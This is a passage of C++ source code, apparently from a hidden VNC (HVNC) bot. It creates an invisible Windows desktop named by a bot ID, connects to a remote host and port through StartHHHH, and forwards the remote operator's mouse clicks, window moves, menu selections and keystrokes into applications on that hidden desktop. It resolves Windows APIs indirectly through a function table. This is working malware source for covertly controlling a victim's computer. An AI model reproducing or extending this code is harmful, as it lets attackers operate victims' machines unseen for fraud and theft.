                    windowPlacement.length = sizeof(windowPlacement);
                    Funcs::pGetWindowPlacement(topHwnd, &windowPlacement);
                    if (windowPlacement.flags & SW_SHOWMAXIMIZED)
                        Funcs::pPostMessageA(topHwnd, WM_SYSCOMMAND, SC_RESTORE, 0);
                    else
                        Funcs::pPostMessageA(topHwnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                    break;
                }
                }
            }
            else if (msg == WM_LBUTTONDOWN)
            {
                lmouseDown = TRUE;
                g_lastInputHwnd = hWnd;
                hResMoveWindow = GetMovableTopWindow(hWnd);
                resMoveType = Funcs::pSendMessageA(hResMoveWindow, WM_NCHITTEST, NULL, lParam);

                if (ShouldLogInput(msg))
                    printf("[input] nchittest WM_LBUTTONDOWN target=0x%p moveWindow=0x%p hit=%lld movable=%d\n",
                        hWnd,
                        hResMoveWindow,
                        (long long)resMoveType,
                        IsMoveResizeHit(resMoveType));

                RECT startButtonRect;
                HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
                if (hStartButton && Funcs::pGetWindowRect(hStartButton, &startButtonRect) && Funcs::pPtInRect(&startButtonRect, point))
                {
                    BOOL posted = Funcs::pPostMessageA(hStartButton, BM_CLICK, 0, 0);
                    if (ShouldLogInput(msg))
                        LogInputTarget("start-button", msg, hStartButton, point, point, posted);
                    continue;
                }
                else
                {
                    char windowClass[MAX_PATH] = { 0 };
                    Funcs::pRealGetWindowClassA(hWnd, windowClass, MAX_PATH);

                    if (!Funcs::pLstrcmpA(windowClass, Strs::hd1))
                    {
                        HMENU hMenu = (HMENU)Funcs::pSendMessageA(hWnd, MN_GETHMENU, 0, 0);
                        int itemPos = Funcs::pMenuItemFromPoint(NULL, hMenu, point);
                        int itemId = Funcs::pGetMenuItemID(hMenu, itemPos);
                        Funcs::pPostMessageA(hWnd, 0x1e5, itemPos, 0);
                        Funcs::pPostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
                        continue;
                    }
                }
            }
            else if (msg == WM_MOUSEMOVE && lmouseDown && hResMoveWindow && IsMoveResizeHit(resMoveType))
            {
                int moveX = lastPointCopy.x - point.x;
                int moveY = lastPointCopy.y - point.y;

                RECT rect;
                if (!Funcs::pGetWindowRect(hResMoveWindow, &rect))
                    break;

                int x = rect.left;
                int y = rect.top;
                int width = rect.right - rect.left;
                int height = rect.bottom - rect.top;
                switch (resMoveType)
                {
                case HTCAPTION:
                    x -= moveX;
                    y -= moveY;
                    break;
                case HTTOP:
                    y -= moveY;
                    height += moveY;
                    break;
                case HTBOTTOM:
                    height -= moveY;
                    break;
                case HTLEFT:
                    x -= moveX;
                    width += moveX;
                    break;
                case HTRIGHT:
                    width -= moveX;
                    break;
                case HTTOPLEFT:
                    y -= moveY;
                    height += moveY;
                    x -= moveX;
                    width += moveX;
                    break;
                case HTTOPRIGHT:
                    y -= moveY;
                    height += moveY;
                    width -= moveX;
                    break;
                case HTBOTTOMLEFT:
                    height -= moveY;
                    x -= moveX;
                    width += moveX;
                    break;
                case HTBOTTOMRIGHT:
                    height -= moveY;
                    width -= moveX;
                    break;
                }

                if (width < 50)
                    width = 50;
                if (height < 50)
                    height = 50;

                SetLastError(0);
                BOOL movedWindow = Funcs::pMoveWindow(hResMoveWindow, x, y, width, height, TRUE);
                if (ShouldLogInput(msg))
                    printf("[input] move-window hwnd=0x%p hit=%lld pos=(%d,%d,%d,%d) result=%s lastError=%lu\n",
                        hResMoveWindow,
                        (long long)resMoveType,
                        x,
                        y,
                        width,
                        height,
                        movedWindow ? "ok" : "failed",
                        GetLastError());
                continue;
            }
            break;
        }
        }

        POINT screenPoint = point;
        POINT clientPt = { 0, 0 };

        if (!hWnd)
        {
            if (ShouldLogInput(msg))
                LogInputTarget("drop-no-target", msg, NULL, screenPoint, clientPt, FALSE);
            continue;
        }

        if (mouseMsg)
        {
            for (HWND currHwnd = hWnd;;)
            {
                hWnd = currHwnd;
                Funcs::pScreenToClient(currHwnd, &point);
                currHwnd = ChildWindowFromPointEx(currHwnd, point, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
                if (!currHwnd || currHwnd == hWnd)
                    break;
                char childClass[128] = { 0 };
                GetClassNameA(currHwnd, childClass, sizeof(childClass));
                if (IsExcludedInputClass(childClass))
                    break;
            }

            if (msg != WM_MOUSEMOVE)
            {
                while ((Funcs::pGetWindowLongA(hWnd, GWL_STYLE) & WS_CHILD) &&
                    (Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE) & WS_EX_NOREDIRECTIONBITMAP))
                {
                    HWND parent = Funcs::pGetParent(hWnd);
                    if (!parent)
                        break;
                    hWnd = parent;
                }
            }

            clientPt = screenPoint;
            Funcs::pScreenToClient(hWnd, &clientPt);
            if (msg != WM_MOUSEWHEEL)
                lParam = MAKELPARAM(clientPt.x, clientPt.y);
            g_lastInputHwnd = hWnd;

            if (msg == WM_LBUTTONDOWN)
            {
                LogWindowDetails("final-mouse-target", hWnd);
                char className[128] = { 0 };
                char title[128] = { 0 };
                DescribeWindow(hWnd, className, sizeof(className), title, sizeof(title));
                if (!lstrcmpiA(className, "UserOOBEWindowClass"))
                    DumpHiddenDesktopWindows("target-UserOOBEWindowClass");
            }
        }
        else
        {
            clientPt = screenPoint;
        }

        UpdateKeyStateCache(msg, wParam, keyDown);
        SetLastError(0);
        BOOL posted = Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
        if (ShouldLogInput(msg))
            LogInputTarget("post-hidden", msg, hWnd, screenPoint, clientPt, posted);
    }
exit:
    printf("[!] Input thread exiting\n");
    if (s)
        Funcs::pClosesocket(s);
    if (g_hDesktopThread)
        Funcs::pTerminateThread(g_hDesktopThread, 0);
    return 0;
}

static DWORD WINAPI MainThread(LPVOID param)
{
    Funcs::pMemset(g_desktopName, 0, sizeof(g_desktopName));
    GetBotId(g_desktopName);
    printf("[diag] Hidden desktop name: %s\n", g_desktopName);

    Funcs::pMemset(&g_bmpInfo, 0, sizeof(g_bmpInfo));
    g_bmpInfo.bmiHeader.biSize = sizeof(g_bmpInfo.bmiHeader);
    g_bmpInfo.bmiHeader.biPlanes = 1;
    g_bmpInfo.bmiHeader.biBitCount = 24;
    g_bmpInfo.bmiHeader.biCompression = BI_RGB;
    g_bmpInfo.bmiHeader.biClrUsed = 0;

    GdiplusStartupInput gdiplusStartupInput;
    if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) == Ok)
        g_gdiplusStarted = TRUE;
    printf("[diag] GDI+ startup: %s\n", g_gdiplusStarted ? "ok" : "failed");

    g_hDesk = Funcs::pOpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
    if (!g_hDesk)
    {
        printf("[diag] OpenDesktop failed; creating hidden desktop\n");
        g_hDesk = Funcs::pCreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
    }
    else
        printf("[diag] OpenDesktop succeeded\n");

    if (!g_hDesk)
        printf("[!] CreateDesktop/OpenDesktop failed: GetLastError=%lu\n", Funcs::pGetLastError());
    else
        printf("[+] Hidden desktop ready: handle=0x%p\n", g_hDesk);

    if (g_hDesk && Funcs::pSetThreadDesktop(g_hDesk))
        printf("[diag] Main thread attached to hidden desktop\n");
    else
        printf("[!] Main thread SetThreadDesktop failed: GetLastError=%lu\n", Funcs::pGetLastError());

    g_hInputThread = Funcs::pCreateThread(NULL, 0, InputThread, NULL, 0, 0);
    if (g_hInputThread)
        printf("[diag] Input thread created\n");
    else
        printf("[!] Input thread creation failed: GetLastError=%lu\n", Funcs::pGetLastError());

    if (g_hInputThread)
        Funcs::pWaitForSingleObject(g_hInputThread, INFINITE);
    if (g_hDesktopThread)
        Funcs::pWaitForSingleObject(g_hDesktopThread, INFINITE);

    if (g_gdiplusStarted)
    {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusStarted = FALSE;
    }

    FreePixelBuffers();

    if (g_hInputThread)
        Funcs::pCloseHandle(g_hInputThread);
    if (g_hDesktopThread)
        Funcs::pCloseHandle(g_hDesktopThread);

    g_hInputThread = NULL;
    g_hDesktopThread = NULL;
    g_started = FALSE;
    printf("[diag] Main thread cleanup complete\n");
    return 0;
}

HANDLE StartHHHH(const char *host, int port)
{
    if (g_started)
        return NULL;
    Funcs::pLstrcpyA(g_host, host);
    g_port = port;
    printf("[diag] StartHHHH requested for %s:%d\n", g_host, g_port);
    g_started = TRUE;
    HANDLE hThread = Funcs::pCreateThread(NULL, 0, MainThread, NULL, 0, 0);
    printf("[diag] Main thread handle: 0x%p\n", hThread);
    return hThread;
}
